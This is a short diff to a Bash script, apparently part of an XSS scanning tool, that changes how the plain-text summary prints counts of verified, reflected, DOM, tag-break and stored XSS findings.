-        echo -e "  ${GREEN}[CB]${RESET} Tag-break : ${GREEN}${BOLD}$CB${RESET}  ${DIM}(crossbow recheck)${RESET}" >&2
+if [[ "$FORMAT" == "plain" ]]; then
+    if [[ $SKIP_SCAN -eq 0 ]]; then
+        [[ $V -gt 0 ]] && VC="${RED}${BOLD}$V${RESET}" || VC="$V"
+        [[ $R -gt 0 ]] && RC="${YELLOW}$R${RESET}" || RC="$R"
+        [[ $A -gt 0 ]] && AC="${CYAN}$A${RESET}" || AC="$A"
+        echo -e "  ${RED}[V]${RESET} Verified  : $VC" >&2
+        echo -e "  ${YELLOW}[R]${RESET} Reflected : $RC" >&2
+        echo -e "  ${CYAN}[A]${RESET} DOM (AST) : $AC" >&2
+        if [[ $CB -gt 0 ]]; then
+            echo -e "  ${GREEN}[CB]${RESET} Tag-break : ${GREEN}${BOLD}$CB${RESET}  ${DIM}(crossbow recheck)${RESET}" >&2
+        fi
     fi
-    echo -e "" >&2
+    if [[ $SXSS_V -gt 0 ]]; then
+        echo -e "  ${GREEN}[SXSS]${RESET} Stored  : ${GREEN}${BOLD}$SXSS_V${RESET}  ${DIM}(crossbow probe)${RESET}" >&2
+    fi
+    if [[ $SKIP_SCAN -eq 0 || $SXSS_V -gt 0 ]]; then
+        echo -e "" >&2
+    fi
 fi
 echo -e "  Results : ${DIM}$RESULTS_FILE${RESET}" >&2
 if [[ $SXSS_COUNT -gt 0 ]]; then
